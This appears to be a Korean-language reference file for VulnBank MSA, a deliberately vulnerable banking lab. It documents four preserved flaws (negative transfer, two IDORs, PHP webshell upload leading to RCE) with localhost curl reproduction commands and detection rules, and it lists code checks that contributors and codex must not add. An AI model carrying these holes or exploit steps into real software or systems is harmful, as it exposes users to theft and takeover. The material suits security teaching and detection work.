# VulnBank MSA Intentional Vulnerabilities

이 워크로드는 **보안 실습용**이다. 아래 4가지 결함은 **의도적으로 보존**되어 있으며 5 phase MSA 전환 내내 재현 가능함이 evidence로 확인됐다 (`reports/dev/manual/`, `reports/dev/phase1/`, `reports/dev/phase3/`, `reports/dev/phase4/`, `reports/dev/phase5/`).

**팀의 Falco rule, Cilium NetworkPolicy, ZAP scan rule을 작성할 때 이 문서를 reference로 사용하라.** 새 권한 검증을 추가해 vulnerability를 "고쳐버리면" demo 자체가 깨진다.

---

## Vuln #1 — 음수 송금 (Negative Transfer)

| 항목 | 값 |
| --- | --- |
| 위치 | `examples/vulnbank-msa/services/transaction-service/public/api.php` |
| 함수 | `transactionSendLocal($sender, $recipient, $amount, $comment)` |
| 결함 | `$amount`의 부호 검증이 없음. `empty()` 체크와 잔액 비교만 존재 |
| 트리거 | `POST /api/v1/transactions/transfer` body에 `amount=-10` |

### 재현 명령

```bash
TOKEN=$(curl -sS -X POST http://localhost:18080/api/v1/auth/login \
  --data-urlencode "username=j.doe" --data-urlencode "password=password" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")

curl -sS -X POST http://localhost:18080/api/v1/transactions/transfer \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "sender=DE12345123451234512345" \
  --data-urlencode "recipient=DE00000111112222233333" \
  --data-urlencode "amount=-10" \
  --data-urlencode "comment=evidence"
# Expected: HTTP 200, status=success, "Sent -10$ to ..."
```

### 기대되는 detection 도구

| 도구 | 룰 형태 |
| --- | --- |
| OWASP ZAP custom rule | response.status=success && request body의 amount 음수 매칭 → Alert "Negative Transfer Accepted" |
| SQL audit (별도) | `INSERT INTO transactions (...) VALUES (..., negative_value, ...)` SELECT/INSERT log 분석 |
| 응용 메트릭 (Prometheus) | `vulnbank_transaction_amount_bucket{le="0"}` 카운터 증가 → Grafana alert |

---

## Vuln #2 — IDOR Transaction History

| 항목 | 값 |
| --- | --- |
| 위치 | `examples/vulnbank-msa/services/transaction-service/public/api.php` `case "history":` |
| 결함 | `args["account_number"]`를 그대로 사용해 history를 조회. token claim의 account와 일치하는지 검증하지 않음 |
| 트리거 | `POST /api/v1/transactions/history` body에 본인 계좌가 아닌 `account_number=...` |

### 재현 명령

j.doe의 토큰으로 j.adams의 history를 조회:

```bash
# (j.doe 로그인 토큰 사용)
curl -sS -X POST http://localhost:18080/api/v1/transactions/history \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "account_number=DE00000111112222233333"
# Expected: HTTP 200, status=success, transactions 배열에 j.adams credit card "5138-3266-5138-5315" 평문 노출
```

### 기대되는 detection 도구

| 도구 | 룰 형태 |
| --- | --- |
| OWASP ZAP active scan | account_number를 다른 값으로 fuzz → response에 다른 사용자의 PII가 나오면 Alert |
| Istio AuthorizationPolicy | request body에서 account_number 추출 → JWT claim과 비교 (Lua/Wasm filter) |
| 응용 audit log | "user X reads account Y" 패턴 detection |

---

## Vuln #3 — IDOR User Update

| 항목 | 값 |
| --- | --- |
| 위치 | `examples/vulnbank-msa/services/settings-service/public/api.php` `settingsInfoUpdateLocal()` |
| 결함 | `$args["id"]`를 그대로 update target으로 사용. token claim의 id와 일치 여부 미검증 |
| 트리거 | `POST /api/v1/settings/infoupdate` body에 본인 id가 아닌 `id=2` (또는 임의 id) |

### 재현 명령

j.doe(id=1) 토큰으로 j.adams(id=2)의 프로필 수정:

```bash
curl -sS -X POST http://localhost:18080/api/v1/settings/infoupdate \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "id=2" \
  --data-urlencode "firstname=Pwned" \
  --data-urlencode "lastname=Adams" \
  --data-urlencode "phone=15559999" \
  --data-urlencode "email=pwned@example.test" \
  --data-urlencode "birthdate=1990-05-05" \
  --data-urlencode "about=changed-by-idor"
# Expected: HTTP 200, status=success, "User j.adams updated successfully"
```

### 기대되는 detection 도구

| 도구 | 룰 형태 |
| --- | --- |
| OWASP ZAP active scan | id를 다른 값으로 변조 → 다른 사용자가 수정되는지 확인 |
| Istio AuthorizationPolicy + Wasm filter | request body의 id ↔ JWT claim id 비교, 불일치면 deny |
| MariaDB audit log | "tx by user X updates user Y row" 패턴 |

---

## Vuln #4 — File Upload + RCE (Frontend Gateway 경유)

| 항목 | 값 |
| --- | --- |
| 위치 | `examples/vulnbank-msa/services/file-service/public/api.php` `fileUploadAvatarLocal()` |
| 결함 | 확장자/MIME 검증 없음. 파일명을 그대로 사용. `chmod 0777`. PHP 파일을 그대로 저장 |
| 보조 위치 | `examples/vulnbank-msa/services/frontend/public/gateway.php` `gateway_proxy_file_request()` — `/vulnbank/online/uploads/*` 요청을 file-service의 `/uploads/*`로 forward |
| 트리거 | (1) PHP webshell을 `upload_avatar`로 업로드 → (2) 같은 파일을 GET으로 호출 → 서버에서 PHP 실행 |

### 재현 명령

```bash
# 1. 웹쉘 페이로드 작성
cat > /tmp/webshell.php <<'EOF'
<?php echo 'VULNBANK_MSA_EVIDENCE_WEBSHELL_OK'; ?>
EOF

# 2. 업로드
SOURCE=$(curl -sS -X POST http://localhost:18080/api/v1/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "id=1" \
  -F "upload_avatar=@/tmp/webshell.php;type=application/x-php" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['source'])")
echo "uploaded as: $SOURCE"

# 3. GET 호출로 PHP 실행
curl -sS http://localhost:18080/vulnbank/online/$SOURCE
# Expected: 응답 본문에 "VULNBANK_MSA_EVIDENCE_WEBSHELL_OK"
```

### 기대되는 detection 도구

| 도구 | 룰 형태 |
| --- | --- |
| Falco rule | 컨테이너 안에서 `.php` 파일이 `/var/www/html/uploads/`에 새로 written → Alert. 또한 `php-cli` 프로세스가 그 파일을 execute → Alert |
| Cilium NetworkPolicy | file-service의 outbound를 제한 (RCE 후 C2 callback 차단) |
| ZAP scan | upload endpoint에 다양한 확장자 fuzz → 200 응답이면 vulnerability flag |
| Kyverno admission policy | (별도) `imagePullPolicy: Always` 등 정책으로 컨테이너 무결성 검사 |

---

## Phase 2 미충족 — Mitre ATT&CK 매핑 (참고)

각 vuln이 ATT&CK 어디에 해당하는지 매핑해두면 발표 시 활용 가능:

| Vuln | ATT&CK Tactic | Technique |
| --- | --- | --- |
| #1 음수 송금 | Impact | T1499 (App Denial of Service) / Business logic abuse |
| #2 IDOR history | Discovery / Collection | T1530 (Data from Cloud Storage Object) |
| #3 IDOR update | Privilege Escalation / Impact | T1078.003 (Local Accounts) — but really business logic |
| #4 File upload RCE | Initial Access / Execution | T1190 (Exploit Public-Facing App) + T1059 (Command and Scripting Interpreter) |

---

## 안 한 vulnerability (참고)

원본 VulnBank monolith는 위 4개 외에도 다음을 포함하지만, 우리 PoC에서는 환경/스택 차이로 재현되지 않거나 미테스트:

| 원본 vulnerability | 우리 PoC 상태 |
| --- | --- |
| DOM-based XSS | UI dom 안 옮김. 재현 안 됨 |
| Stored XSS | infoupdate로 `about` 필드에 script 넣을 수 있으나 표시 페이지를 안 옮김 |
| CSRF | API 호출 흐름이라 의미가 적음. 별도 demo 필요 |
| XML External Entity (XXE) | `gateway.php`의 XML 핸들링 코드 일부 보존됨 — 트리거 미테스트 |
| Race condition | 송금 race 미테스트 |
| Session hijacking | session 흐름이 token으로 바뀌어 의미 변화. 토큰 탈취 demo는 별도 시나리오 |
| ImageTragick (CVE-2016-3714) | 베이스 이미지 변경(`php:7.4-cli`)으로 ImageMagick 없음. 재현 불가 |
| SQL injection (`userCheck`) | 코드는 보존되어 있으나 user-service의 lookup_by_login 등으로 흐름이 일부 우회 가능. 미테스트 |

추가 vulnerability를 demo에 포함하려면 별도 작업 필요.

---

## 변경 금지 영역

이 4가지 vulnerability를 우연히 "고치는" 코드 변경을 가장 자주 만드는 패턴:

- `transactionSendLocal`에 `if ($amount <= 0)` 추가 → Vuln #1 사라짐
- `history` case에 token claim과 account 비교 추가 → Vuln #2 사라짐
- `settingsInfoUpdateLocal`에 `if ($id != $_SESSION["id"])` 추가 → Vuln #3 사라짐
- `fileUploadAvatarLocal`에 확장자 화이트리스트 / `pathinfo` / `mime_content_type` 검증 추가 → Vuln #4 사라짐

**모든 PR/codex 작업에서 이 패턴이 들어왔는지 review 시 반드시 확인.**
